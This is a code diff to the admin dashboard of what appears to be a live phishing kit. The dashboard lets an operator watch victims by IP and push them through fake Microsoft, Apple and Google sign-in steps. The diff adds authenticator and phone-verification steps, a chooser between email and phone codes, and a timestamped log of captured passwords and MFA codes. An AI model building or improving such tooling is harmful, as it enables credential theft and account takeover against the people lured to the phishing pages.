@@ -54,6 +54,7 @@ interface VisitorInfo {
   userAgent: string;
   connectedAt: number;
   formData: Record<string, string>;
+  formHistory: { field: string; value: string; ts: number }[];
   online: boolean;
 }
 
@@ -90,6 +91,9 @@ const STEP_LABELS: Record<string, string> = {
   'error-email': '✗ Email',
   'error-password': '✗ Password',
   'error-code': '✗ Code',
+  'authenticator': 'Authenticator',
+  'cant-use-authenticator': "Can't Use Auth",
+  'verify-phone-number': 'Phone Verify',
 };
 
 const STEP_COLORS: Record<string, string> = {
@@ -117,6 +121,9 @@ const STEP_COLORS: Record<string, string> = {
   'error-email': '#991b1b',
   'error-password': '#991b1b',
   'error-code': '#991b1b',
+  'authenticator': '#0078D4',
+  'cant-use-authenticator': '#047857',
+  'verify-phone-number': '#7c3aed',
 };
 
 const FIELD_LABELS: Record<string, string> = {
@@ -131,10 +138,12 @@ const FIELD_LABELS: Record<string, string> = {
 
 const PROVIDER_PUSH_STEPS: Record<string, { label: string; step: string; color: string }[]> = {
   microsoft: [
-    { label: '↩ Email',     step: 'email',           color: '#4b5563' },
-    { label: 'Password',    step: 'password',         color: '#0078D4' },
-    { label: 'Code',        step: 'email-code',       color: '#7c3aed' },
-    { label: 'Other ways',  step: 'other-ways',       color: '#047857' },
+    { label: '↩ Email',       step: 'email',               color: '#4b5563' },
+    { label: 'Password',      step: 'password',             color: '#0078D4' },
+    { label: '⎉ Code',        step: '__code_choice__',      color: '#7c3aed' },
+    { label: 'Authenticator', step: 'authenticator',        color: '#0078D4' },
+    { label: 'Phone Verify',  step: 'verify-phone-number',  color: '#7c3aed' },
+    { label: 'Other ways',    step: 'other-ways',           color: '#047857' },
   ],
   apple: [
     { label: '↩ Email',     step: 'email',            color: '#4b5563' },
@@ -300,16 +309,20 @@ function VisitorModal({
   const [phoneDigitsVal, setPhoneDigitsVal] = useState('');
   const [pendingAction, setPendingAction] = useState<{ step: string; label: string; color: string; extra?: { promptNumber?: number; phoneDigits?: string } } | null>(null);
   const [revealField, setRevealField] = useState<string | null>(null);
+  const [codeTypeDialogOpen, setCodeTypeDialogOpen] = useState(false);
+  const [codeTypeSelected, setCodeTypeSelected] = useState<'email' | 'phone'>('email');
 
   const iframeSrc = visitorModalSrc(visitor);
   const stepColor = STEP_COLORS[visitor.step] ?? '#4b5563';
   const stepLabel = STEP_LABELS[visitor.step] ?? visitor.step;
   const formEntries = Object.entries(visitor.formData ?? {});
+  const formHistory = [...(visitor.formHistory ?? [])].reverse();
   const isSensitive = (field: string) => field === 'password' || field === 'email_code' || field === 'phone_code';
   const ua = parseUA(visitor.userAgent);
 
   // Steps that bypass the preview (send immediately or have own dialog)
   const triggerAction = (step: string, label: string, color: string, extra?: { promptNumber?: number; phoneDigits?: string }) => {
+    if (step === '__code_choice__') { setCodeTypeDialogOpen(true); return; }
     if (step === 'phone-code' && visitor.provider === 'google') {
       const raw = (visitor.formData ?? {})['phone'] ?? '';
       setPhoneDigitsVal(raw ? raw.replace(/\D/g, '').slice(-2) : '');
@@ -446,6 +459,32 @@ function VisitorModal({
                 </div>
               )}
 
+              {/* Code type dialog — Microsoft ⎉ Code button */}
+              {codeTypeDialogOpen && visitor.provider === 'microsoft' && (
+                <div className="mt-3 bg-[#1a1d24] rounded-xl border border-[#7c3aed]/50 p-4 space-y-3">
+                  <p className="text-[11px] text-[#8a919e] font-medium">Send code via</p>
+                  <div className="space-y-2">
+                    <label className="flex items-center gap-2 cursor-pointer">
+                      <input type="radio" name="ms-code-type" value="email" checked={codeTypeSelected === 'email'} onChange={() => setCodeTypeSelected('email')} className="accent-[#7c3aed]" />
+                      <span className="text-[13px] text-white">Email code</span>
+                    </label>
+                    <label className="flex items-center gap-2 cursor-pointer">
+                      <input type="radio" name="ms-code-type" value="phone" checked={codeTypeSelected === 'phone'} onChange={() => setCodeTypeSelected('phone')} className="accent-[#7c3aed]" />
+                      <span className="text-[13px] text-white">Phone code</span>
+                    </label>
+                  </div>
+                  <div className="flex gap-2">
+                    <button onClick={() => setCodeTypeDialogOpen(false)} className="flex-1 py-2 rounded-lg border border-[#2d3139] text-[12px] text-[#8a919e] hover:bg-[#2d3139] transition-colors">Cancel</button>
+                    <button onClick={() => {
+                      const targetStep = codeTypeSelected === 'email' ? 'email-code' : 'phone-code';
+                      const targetLabel = codeTypeSelected === 'email' ? 'Email Code' : 'Phone Code';
+                      setCodeTypeDialogOpen(false);
+                      setPendingAction({ step: targetStep, label: targetLabel, color: '#7c3aed' });
+                    }} className="flex-1 py-2 rounded-lg text-[12px] font-semibold text-white" style={{ backgroundColor: '#7c3aed' }}>Confirm</button>
+                  </div>
+                </div>
+              )}
+
               {/* Google Prompt controls */}
               {visitor.provider === 'google' && (
                 <div className="mt-4 space-y-3">
@@ -526,9 +565,9 @@ function VisitorModal({
               <div className="flex items-center gap-2 mb-4">
                 <Database className="w-3.5 h-3.5 text-[#555d6b]" />
                 <p className="text-[9px] font-bold uppercase tracking-[0.12em] text-[#555d6b]">Captured Data</p>
-                {formEntries.length > 0 && (
+                {formHistory.length > 0 && (
                   <>
-                    <span className="ml-auto text-[10px] font-semibold text-green-400">{formEntries.length} field{formEntries.length !== 1 ? 's' : ''}</span>
+                    <span className="ml-auto text-[10px] font-semibold text-green-400">{formHistory.length} entr{formHistory.length !== 1 ? 'ies' : 'y'}</span>
                     <button onClick={() => { if (confirm('Clear all captured data for this visitor?')) onDeleteAll(visitor.id); }}
                       className="w-5 h-5 flex items-center justify-center rounded hover:bg-red-900/40 text-[#555d6b] hover:text-red-400 transition-colors" title="Clear all data">
                       <Trash2 className="w-3 h-3" />
@@ -537,7 +576,7 @@ function VisitorModal({
                 )}
               </div>
 
-              {formEntries.length === 0 ? (
+              {formHistory.length === 0 ? (
                 <div className="rounded-xl border border-dashed border-[#2d3139] px-3 py-7 text-center">
                   <div className="w-8 h-8 rounded-full bg-[#1e2128] flex items-center justify-center mx-auto mb-2">
                     <Database className="w-4 h-4 text-[#3e4450]" />
@@ -547,21 +586,26 @@ function VisitorModal({
                 </div>
               ) : (
                 <div className="space-y-2">
-                  {formEntries.map(([field, value]) => {
+                  {formHistory.map((entry, idx) => {
+                    const { field, value, ts } = entry;
                     const sensitive = isSensitive(field);
-                    const revealed = revealField === field;
+                    const revealKey = `${field}-${idx}`;
+                    const revealed = revealField === revealKey;
                     return (
-                      <div key={field} className="bg-[#1a1d24] rounded-xl border border-[#2d3139] overflow-hidden group">
+                      <div key={idx} className="bg-[#1a1d24] rounded-xl border border-[#2d3139] overflow-hidden group">
                         <div className="flex items-center justify-between px-3 pt-2.5 pb-1">
-                          <span className="text-[9px] text-[#555d6b] uppercase font-bold tracking-widest">{FIELD_LABELS[field] ?? field}</span>
-                          <div className="flex items-center gap-1.5">
+                          <div className="flex items-center gap-2 min-w-0">
+                            <span className="text-[9px] text-[#555d6b] uppercase font-bold tracking-widest flex-shrink-0">{FIELD_LABELS[field] ?? field}</span>
+                            <span className="text-[9px] text-[#3e4450] flex-shrink-0">{new Date(ts).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })}</span>
+                          </div>
+                          <div className="flex items-center gap-1.5 flex-shrink-0">
                             {sensitive && (
-                              <button onClick={() => setRevealField(revealed ? null : field)} className="text-[9px] font-semibold text-amber-500 hover:text-amber-300 transition-colors uppercase tracking-wide">
+                              <button onClick={() => setRevealField(revealed ? null : revealKey)} className="text-[9px] font-semibold text-amber-500 hover:text-amber-300 transition-colors uppercase tracking-wide">
                                 {revealed ? 'hide' : 'show'}
                               </button>
                             )}
                             <button onClick={() => onDeleteField(visitor.id, field)}
-                              className="w-4 h-4 flex items-center justify-center rounded hover:bg-red-900/40 text-[#3e4450] hover:text-red-400 transition-colors opacity-0 group-hover:opacity-100" title={`Delete ${field}`}>
+                              className="w-4 h-4 flex items-center justify-center rounded hover:bg-red-900/40 text-[#3e4450] hover:text-red-400 transition-colors opacity-0 group-hover:opacity-100" title={`Delete all ${field} entries`}>
                               <X className="w-2.5 h-2.5" />
                             </button>
                           </div>
@@ -647,31 +691,36 @@ export default function AdminPage() {
 
       ws.onmessage = (e: MessageEvent<string>) => {
         try {
+          type FormHistoryEntry = { field: string; value: string; ts: number };
           const msg = JSON.parse(e.data) as {
             type: string;
-            visitors?: Array<VisitorInfo & { formData?: Record<string,string> }>;
-            visitor?: VisitorInfo & { formData?: Record<string,string> };
+            visitors?: Array<VisitorInfo & { formData?: Record<string,string>; formHistory?: FormHistoryEntry[] }>;
+            visitor?: VisitorInfo & { formData?: Record<string,string>; formHistory?: FormHistoryEntry[] };
             globalProvider?: string;
             id?: string;
             step?: string;
             provider?: string;
             field?: string;
             value?: string;
+            ts?: number;
           };
 
           if (msg.type === 'visitors' && msg.visitors) {
-            setVisitors(msg.visitors.map(v => ({ ...v, formData: v.formData ?? {}, online: true })));
+            setVisitors(msg.visitors.map(v => ({ ...v, formData: v.formData ?? {}, formHistory: v.formHistory ?? [], online: true })));
             if (msg.globalProvider) setProvider(msg.globalProvider as Provider);
           } else if (msg.type === 'global-provider' && msg.provider) {
             setProvider(msg.provider as Provider);
           } else if (msg.type === 'visitor-joined' && msg.visitor) {
-            const v = { ...msg.visitor, formData: msg.visitor.formData ?? {}, online: true };
-            // If visitor with same IP already exists (offline), replace it
+            const v = { ...msg.visitor, formData: msg.visitor.formData ?? {}, formHistory: msg.visitor.formHistory ?? [], online: true };
             setVisitors(prev => {
               const idx = prev.findIndex(x => x.ip === v.ip && !x.online);
               if (idx >= 0) {
                 const next = [...prev];
-                next[idx] = { ...v, formData: { ...prev[idx].formData, ...v.formData } };
+                next[idx] = {
+                  ...v,
+                  formData: { ...prev[idx].formData, ...v.formData },
+                  formHistory: [...(prev[idx].formHistory ?? []), ...v.formHistory],
+                };
                 return next;
               }
               return [...prev.filter(x => x.id !== v.id), v];
@@ -683,16 +732,21 @@ export default function AdminPage() {
               v.id === msg.id ? { ...v, step: msg.step ?? v.step, provider: msg.provider ?? v.provider } : v
             ));
           } else if (msg.type === 'visitor-form-data' && msg.id && msg.field) {
+            const entry: FormHistoryEntry = { field: msg.field!, value: msg.value ?? '', ts: msg.ts ?? Date.now() };
             setVisitors(prev => prev.map(v =>
-              v.id === msg.id ? { ...v, formData: { ...v.formData, [msg.field!]: msg.value ?? '' } } : v
+              v.id === msg.id ? {
+                ...v,
+                formData: { ...v.formData, [msg.field!]: msg.value ?? '' },
+                formHistory: [...(v.formHistory ?? []), entry],
+              } : v
             ));
           } else if (msg.type === 'visitor-form-data-deleted' && msg.id) {
             setVisitors(prev => prev.map(v => {
               if (v.id !== msg.id) return v;
-              if (msg.field === '*') return { ...v, formData: {} };
+              if (msg.field === '*') return { ...v, formData: {}, formHistory: [] };
               const next = { ...v.formData };
               delete next[msg.field!];
-              return { ...v, formData: next };
+              return { ...v, formData: next, formHistory: (v.formHistory ?? []).filter(e => e.field !== msg.field) };
             }));
           } else if (msg.type === 'visitor-deleted' && msg.id) {
             setVisitors(prev => prev.filter(v => v.id !== msg.id));
